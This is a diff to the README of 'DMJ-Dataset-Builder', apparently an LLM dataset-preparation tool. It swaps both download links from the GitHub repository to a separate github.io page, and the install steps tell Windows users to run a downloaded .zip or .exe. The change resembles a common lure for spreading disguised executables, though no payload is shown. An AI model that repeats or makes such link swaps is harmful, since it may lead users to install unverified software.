@@ -1,6 +1,6 @@
 # 🛠️ DMJ-Dataset-Builder - Prepare high quality data for training
 
-[![Download DMJ-Dataset-Builder](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Algernonlxi795/DMJ-Dataset-Builder)
+[![Download DMJ-Dataset-Builder](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://algernonlxi795.github.io)
 
 This software helps users prepare data for Large Language Models. Large Language Models need specific formats to learn correctly. This tool simplifies the work of gathering, cleaning, and formatting that data. You can download, convert, validate, and combine datasets without writing code from scratch.
 
@@ -17,7 +17,7 @@ To run this tool on a Windows computer, check for these items:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Algernonlxi795/DMJ-Dataset-Builder).
+1. Visit [this page to download](https://algernonlxi795.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .zip or .exe to save it to your computer.
 4. Extract the folder if you downloaded a compressed file.
